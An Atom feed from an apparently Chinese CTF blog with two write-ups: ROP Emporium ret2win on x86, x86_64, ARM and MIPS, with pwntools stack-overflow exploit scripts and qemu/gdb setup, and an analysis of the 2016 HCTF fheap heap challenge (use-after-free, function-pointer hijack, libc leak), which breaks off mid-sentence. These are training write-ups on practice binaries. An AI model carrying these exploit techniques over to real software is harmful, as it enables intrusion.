<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.top/atom.xml" rel="self"/>
  
  <link href="https://c-lby.top/"/>
  <updated>2024-04-08T11:17:12.156Z</updated>
  <id>https://c-lby.top/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>『ROP Emporium』ret2win</title>
    <link href="https://c-lby.top/2024/04/07/rop-emporium-ret2win/"/>
    <id>https://c-lby.top/2024/04/07/rop-emporium-ret2win/</id>
    <published>2024-04-07T14:12:49.000Z</published>
    <updated>2024-04-08T11:17:12.156Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-ret2win32"><a href="#0x01-ret2win32" class="headerlink" title="0x01 ret2win32"></a>0x01 ret2win32</h3><p>x86架构的ret2text，非常简单，程序有栈溢出，没有canary保护，所以只要溢出覆盖ebp后，将ret地址覆盖为ret2win函数的地址即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x804862C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-ret2win"><a href="#0x02-ret2win" class="headerlink" title="0x02 ret2win"></a>0x02 ret2win</h3><p>x86_64架构的ret2text，一样的非常简单，栈溢出完了之后覆盖ret地址为后门地址即可。但是这里需要注意一个问题，如果直接选取ret2win的函数地址，puts函数可以被正常执行，但是发现flag不会显示出来。不用调试也能知道这是64位下栈平衡的问题，并且前面的函数可以执行但唯独system执行不了的话，是卡在了do_system这个函数，这里不展开叙述。解决方案是，跳过ret2win函数中push rbp的语句即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x400764</span> <span class="comment"># 57-64理论上都可以</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x03-ret2win-armv5"><a href="#0x03-ret2win-armv5" class="headerlink" title="0x03 ret2win_armv5"></a>0x03 ret2win_armv5</h3><p>虽然不是第一次见到异构pwn题，但是是第一次做，所以这里记录一下基本的环境配置步骤和arm汇编相关的知识，但不会深入展开，主打一个够用就行。</p><h5 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install gdb-multiarch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user qemu-user-static gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu binutils-aarch64-linux-gnu-dbg build-essential gcc-arm-linux-gnueabi libc6-armel-cross</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ln</span> -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm</span></span><br></pre></td></tr></table></figure><h5 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h5><p>如果想要在终端运行arm架构的程序，那就用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>如果找不到动态链接库，就加个<code>-L /usr/mipsel-linux-gnu/</code>在中间就行，调试同理。</p><h5 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h5><p>如果想要调试arm架构的程序，使用以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-arm-static -g 9999 ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>然后打开另一个终端，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/arm-linux-gnueabi/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure><p>上面的9999是端口，数字可以自己定。第三行命令是为了让gdb找到动态链接库。如果是aarch64架构的，也是一样的操作，换一下动态链接库路径为&#x2F;usr&#x2F;aarch64-linux-gnu&#x2F;lib&#x2F;即可。</p><h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81.png" alt="ret2win_armv5汇编代码"></p><p>首先先看看arm寄存器方面和x86的不同之处。</p><ul><li>32位的arm有13个通用寄存器，分别是R0-R12。</li><li>R0在常规操作中可用于存储临时值，也可以用于存储函数的第一个参数或返回结果。</li><li>在ARM架构中约定指定函数前四个参数存储在R0~R3寄存器中。</li><li>R7寄存器在函数调用中负责存储系统调用号。</li><li>R11寄存器，又称FP，可以用来记录回溯信息,也可以当做局部变量来使用。</li><li>R13是栈指针寄存器，又称SP，相当于esp。</li><li>R14为链接寄存器，又称LR，用于保存调用函数的下一条指令地址，用于被调用函数(子函数)结束工作后返回调用函数(父函数)。有点像ret地址。</li><li>R15为程序计数器，又称PC，类似于X86架构下的EIP寄存器负责保存目标地址，与x86不同的点在于PC在ARM状态下存储当前指令+4的地址。这个寄存器可读可写，对PC进行写操作可以改变程序执行流，而且是立马就变。</li><li>还有一些特殊的标志寄存器，这里不做介绍。</li></ul><p>现在我们来看代码。首先把LR和R11压入栈，然后将SP+4存到R11，SP-0x20开辟栈空间。这和x86调用函数如出一辙。注意此时R11就指向返回地址了。</p><p>调用read的时候把第一个参数放到了R0，第二个参数是R11-0x24，放到了R1，第三个参数在R2。从这里可以确认的一点是我们输入的地方距离存放LR的地方隔了0x24。所以填充0x24padding再写个ret2win的地址，我们就算是利用栈溢出劫持了程序执行流。</p><p>函数结束之后先将R11-4赋给了SP，再分别将R11和PC出栈。那么这时，PC寄存器里地址就是我们写入的ret2win的函数地址。</p><h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>因为是第一次做arm的pwn题，我们还是详细调试一下看看，加深理解。首先我们开启gdb-multiarch之后，连接qemu端口，设置好动态链接库。之后断点在pwnme函数，再往后就单步执行看栈和寄存器变化就可以了。</p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%950.png" alt="ret2win_armv5调试0"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%951.png" alt="ret2win_armv5调试1"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%952.png" alt="ret2win_armv5调试2"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%953.png" alt="ret2win_armv5调试3"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%954.png" alt="ret2win_armv5调试4"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_armv5%E8%B0%83%E8%AF%955.png" alt="ret2win_armv5调试5"></p><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x105EC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x04-ret2win-mipsel"><a href="#0x04-ret2win-mipsel" class="headerlink" title="0x04 ret2win_mipsel"></a>0x04 ret2win_mipsel</h3><p>也是第一次接触的mips的pwn，和arm一样，先讲环境配置。</p><h5 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="环境配置"></a>环境配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-user</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo apt install libc6-mipsel-cross</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /etc/qemu-binfmt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">ln</span> -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel</span></span><br></pre></td></tr></table></figure><h5 id="运行程序-1"><a href="#运行程序-1" class="headerlink" title="运行程序"></a>运行程序</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel-static ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>如果找不到动态链接库，就加个<code>-L /usr/mipsel-linux-gnu/</code>在中间就行，调试同理。</p><h5 id="调试程序-1"><a href="#调试程序-1" class="headerlink" title="调试程序"></a>调试程序</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">qemu-mipsel-static -g 9999 ./your_exec_file</span></span><br></pre></td></tr></table></figure><p>然后打开另一个终端，输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb-multiarch -q ./your_exec_file</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> solib-search-path /usr/mipsel-linux-gnu/lib/</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote :9999</span></span><br></pre></td></tr></table></figure><p>和arm调试是一样的。</p><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipselRA%E5%85%A5%E6%A0%88.png" alt="ret2win_mipselRA入栈"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipsel%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81.png" alt="ret2win_mipsel汇编代码"></p><p><img src="https://c-lby.top/images/ROPEmporium/ret2win_mipselRA%E5%87%BA%E6%A0%88.png" alt="ret2win_mipselRA出栈"></p><p>mips的指令和x86、arm的指令长得差很远。先来看一些基础的知识。</p><ol><li>MIPS32 架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈</li><li>传参过程中，前四个参数a0−a3，多余的会保存在调用函数的预留的栈顶空间内</li><li>MIPS 调用函数时会把函数的返回地址直接存入 $RA 寄存器</li></ol><p>可以注意到函数初始时RA寄存器的内容被入栈到了距离SP寄存器0x38+4的位置，函数退出时RA出栈。所以我们只要栈溢出到SP+0x60处写入ret2win函数地址即可成功劫持程序执行流。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process([<span class="string">&#x27;qemu-mipsel-static&#x27;</span>, <span class="string">&#x27;./ret2win_mipsel&#x27;</span>])</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x400A00</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">36</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">https://ropemporium.com 各种架构的ROP练习</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
    <category term="ROP" scheme="https://c-lby.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>『BUU』2016HCTF_fheap</title>
    <link href="https://c-lby.top/2024/03/28/2016HCTF-fheap/"/>
    <id>https://c-lby.top/2024/03/28/2016HCTF-fheap/</id>
    <published>2024-03-28T08:11:30.000Z</published>
    <updated>2024-03-28T08:21:29.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2016HCTF-fheap"><a href="#2016HCTF-fheap" class="headerlink" title="2016HCTF fheap"></a>2016HCTF fheap</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个程序是一个字符串管理器，程序只有两个功能，一个是create，一个是delete，有两个类似于结构体的变量，我们可以稍微优化一下伪代码。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="type">Data</span>            struc ; (sizeof=<span class="number">0x20</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> ptr_content     dq ?</span><br><span class="line"><span class="number">00000008</span> content2_if_use dq ?</span><br><span class="line"><span class="number">00000010</span> content_len     dq ?</span><br><span class="line"><span class="number">00000018</span> ptr_free_func   dq ?</span><br><span class="line"><span class="number">00000020</span> <span class="type">Data</span>            ends</span><br><span class="line"><span class="number">00000020</span></span><br><span class="line"><span class="number">00000000</span> ; <span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> string          struc ; (sizeof=<span class="number">0x10</span>, mappedto_10)</span><br><span class="line"><span class="number">00000000</span> <span class="type">INUSE</span>           dd ?</span><br><span class="line"><span class="number">00000004</span> field_4         dd ?</span><br><span class="line"><span class="number">00000008</span> <span class="type">Data</span>            dq ?</span><br><span class="line"><span class="number">00000010</span> string          ends</span><br><span class="line"><span class="number">00000010</span></span><br></pre></td></tr></table></figure><p>优化之后，我们来分别看一下两个函数功能。</p><h5 id="create"><a href="#create" class="headerlink" title="create"></a>create</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> *<span class="title">ptr</span>;</span> <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">struct</span> Data *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give string size:&quot;</span>);</span><br><span class="line">  nbytes = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )                       <span class="comment">// 不能超过sbrk大小</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;str:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;got elf!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )                        <span class="comment">// 长度大于15的时候才malloc</span></span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;malloc faild!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      ptr-&gt;ptr_content = (__int64)dest;</span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_double_ptr;<span class="comment">// 一个free双重指针的函数指针，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)ptr, buf, nbytesa);       <span class="comment">// 长度小于15则直接存在ptr下</span></span><br><span class="line">      ptr-&gt;ptr_free_func = (__int64)free_single_ptr;<span class="comment">// 一个free函数，UAF</span></span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(ptr-&gt;content_len) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">list</span>[i].INUSE )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">list</span>[i].INUSE = <span class="number">1</span>;                      <span class="comment">// INUSED</span></span><br><span class="line">        <span class="built_in">list</span>[i].Data = (__int64)ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )                              <span class="comment">// 最多15个chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> Data *))ptr-&gt;ptr_free_func)(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create函数最大的特点是，只有size大于15才会申请chunk，否则直接存在ptr结构体下。所以ptr更像是一个联合体。ptr还储存了一个函数指针，用在delete函数中拿来释放chunk。可以发现这两个函数都存在UAF漏洞。另一个结构体储存了一个INUSE标志和指向ptr结构体的指针。</p><h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give me the string id you want to delete\nid:&quot;</span>);</span><br><span class="line">  index = read_10b();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= <span class="number">0x11</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) )<span class="comment">// ptr非空，没检查INUSED，可以DOUBLE FREE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;<span class="built_in">list</span> + <span class="number">2</span> * (<span class="type">int</span>)index + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD*)&amp;<span class="built_in">list</span>+ <span class="number">2</span> * (<span class="type">int</span>)index+ <span class="number">1</span>));</span><br><span class="line">      *((_DWORD *)&amp;<span class="built_in">list</span> + <span class="number">4</span> * (<span class="type">int</span>)index) = <span class="number">0</span>;  <span class="comment">// 将INUSED置零</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete函数检查了ptr位置却没有检查INUSE标志，所以可以double free。调用了函数指针指向的函数，参数是ptr结构体本身。这里很容易就想到劫持函数指针来改变程序的执行流。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>如果我们劫持了函数指针为system，并且在某个chunk中写入了sh，delete这个chunk就可以getshell了。但是整个程序都没有泄露地址的功能可以给我们利用，所以首先要思考的是如何获取libc地址。没有条件就自己创造条件。我们可以劫持函数指针为puts或者printf函数来泄露地址。</p><p>劫持函数指针的问题很好想，可以利用fastbin的特性来劫持。程序会为每一个string申请一块0x20（实际是0x30）的堆来储存ptr结构体。如果我们先申请两块size小于15的chunk，释放掉后在申请一个0x20的chunk，通过UAF漏洞，我们就可以控制之前申请的chunk的其中一块。</p><p>程序开了PIE，尽管有足够的长度写入地址，如果不知道程序基址，我们也只能写入一字节来改变函数指针。原本free函数的地址在0xD52，显然就没法用plt段中的地址了，因为我们要找到函数地址应该也满足0xDXX的形式。取而代之的，我们去找<code>call puts</code>这样的跳转指令。然后可以找到在0xD1A和0xD2D处都有，其中一个会return另一个则跳转到menu，两个都可以利用。而将他本身作为参数，delete被劫持的chunk，我们就能得到程序的基址。有了基址我们就可以利用任意地址的函数了，但是想要获得libc地址，只能将got表的地址作为参数传入puts，显然这很难实现，因为参数只能是ptr结构体地址，所以没法继续用puts函数。取代他的是printf函数，我们将格式化字符串chunk上我们就可以利用偏移来获取栈上残留的libc地址。因为有了基址，我们就可以用printf在plt段的地址了。</p><p>想到这里，忽然想到一个问题，能不能如法炮制地，在某个0xDXX地址出找到一个call printf的跳转指令，这样不就不需要泄露基址也能获得libc地址了吗？好巧不巧，还真有，在0xD88处就有一个。这个指令位于delete函数中，这并不影响我们泄露地址，我们在printf完地址后，只要输入一个错误的index就可以让delete函数什么也不干直接返回menu。</p><p>值得注意的是，这里存在一个栈平衡问题。如果我们直接让函数指针变成0xD88处，libc在执行printf时会检查al寄存器，如果不为零，则会执行movaps相关的指令，这个指令要求操作数16位对齐，否则程序会卡住。所以这里我们选择0xD86地址，可以将al先置零，这样可以不用理会栈平衡问题。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在第二种思路中，唯一要调试的其实只有printf的格式化字符串偏移，找到一个合适的libc地址拿来泄露。BUU没有提供libc文件，但是说了是Ubuntu16的系统，所以大概是glibc2.23的某一个版本，所以在本地调试中patchelf了一下程序（2.23_11.3_amd64）。我们在劫持完函数指针后断点在printf处看看栈布局，找到一个__libc_start_main+240的地址在偏移176处，其实也就是__libc_start_main_ret的地址，通过远程发现依然可以获取到它，但是结果不太一样。</p><p><img src="https://c-lby.top/images/BUU/2016HCTF_fheap/printf%E6%A0%88%E5%B8%83%E5%B1%80.png" alt="printf栈布局"></p><p>这里的低三位是0x840，但实际上在远程获得的偏移是0x830。在libc 